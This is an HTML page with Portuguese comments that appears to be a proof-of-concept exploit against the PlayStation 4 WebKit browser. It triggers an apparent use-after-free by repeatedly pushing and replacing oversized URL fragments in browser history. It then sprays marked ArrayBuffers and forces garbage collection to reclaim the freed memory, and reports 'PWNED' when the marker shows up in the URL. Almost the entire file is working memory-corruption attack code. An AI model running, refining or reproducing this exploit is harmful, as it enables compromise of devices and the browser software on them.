<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - Buffer + GC Strategy</title>
<style>
    body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
    button { 
        padding: 20px; width: 100%; margin-bottom: 10px;
        font-weight: bold; font-size: 16px; cursor: pointer; 
        border: 2px solid #0f0; background: #003300; color: #fff;
        text-transform: uppercase;
    }
    #log { border: 1px solid #555; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
</style>
</head>
<body>
<h2>PS4 WebKit - Buffer Spray + GC (Non-Blocking)</h2>
<div id="status">Pronto.</div>

<button onclick="runStableExploit()">INICIAR RECLAIM (ESTÁVEL)</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");
function log(m) { 
    const d = document.createElement("div");
    d.textContent = m;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

var keepAlive = [];

// TÉCNICA DO PSFREE.MJS: Função de Garbage Collection
// Isso é essencial para limpar a memória "suja" e permitir a realocação
function forceGC() {
    for (let i = 0; i < 2; i++) {
        // Aloca 4MB temporários para forçar o WebKit a limpar o lixo
        new Uint8Array(4 * 1024 * 1024);
    }
}

async function runStableExploit() {
    logEl.innerHTML = "";
    keepAlive = []; 
    statusEl.innerText = "Rodando...";

    const TARGET_SIZE = 340356;
    
    log(`1. Alvo fixado: ${TARGET_SIZE} bytes.`);
    log("2. Disparando UAF...");
    
    let size = 977;
    const STEP = 14461;

    for(let i = 0; i < 48; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        
        // MOMENTO CRÍTICO
        if (i === 47) {
            log(">>> SPRAY RÁPIDO + GC <<<");
            
            // 1. Agenda o back() que vai liberar a memória 'V'
            setTimeout(() => history.back(), 0);
            
            // 2. IMEDIATAMENTE enche a memória com ArrayBuffers
            // Não usamos loop pesado aqui para não travar a thread
            doQuickSpray(TARGET_SIZE);
            
            // 3. Força o GC para garantir que o 'V' suma e o Buffer entre
            // Isso pode causar uma leve travada, mas é necessária
            setTimeout(() => forceGC(), 10); 
        } else {
            size += STEP;
            await sleep(5);
        }
    }
    
    // Dá um tempo para o GC rodar e a memória assentar
    await sleep(300);

    // === VERIFICAÇÃO ===
    checkResult();
}

function doQuickSpray(size) {
    // Cria 200 buffers de tamanho exato + variações
    // ArrayBuffer é alocado nativamente (rápido, não trava a UI)
    const VARIATIONS = [-32, -16, 0, 16, 32]; // Ajuste fino de header
    
    for(let k=0; k<50; k++) { // 50 lotes
        for(let v of VARIATIONS) {
            try {
                let buf = new ArrayBuffer(size + v);
                let view = new Uint8Array(buf);
                // Marca o início com 'A' (0x41)
                view[0] = 0x41; view[1] = 0x41; view[2] = 0x41; view[3] = 0x41;
                keepAlive.push(buf);
            } catch(e) {}
        }
    }
}

function checkResult() {
    statusEl.innerText = "Verificando...";
    let url = document.URL;
    let changed = false;
    let sample = "";
    
    // Procura por 'A' (0x41)
    for(let i=1000; i<5000; i++) {
        if(url.charCodeAt(i) === 0x41) { 
            changed = true;
            sample = "Encontrado 'AAAA' no offset " + i;
            break;
        }
    }

    if(changed) {
        log("!!! JACKPOT !!!");
        log("Memória Reclamada com Sucesso!");
        log(sample);
        statusEl.innerText = "PWNED";
        statusEl.style.backgroundColor = "#0f0";
        statusEl.style.color = "#000";
    } else {
        log("Falha: Ainda vendo 'V'.");
        log("O GC rodou, mas o buraco ainda está protegido.");
    }
}
</script>
</body>
</html>
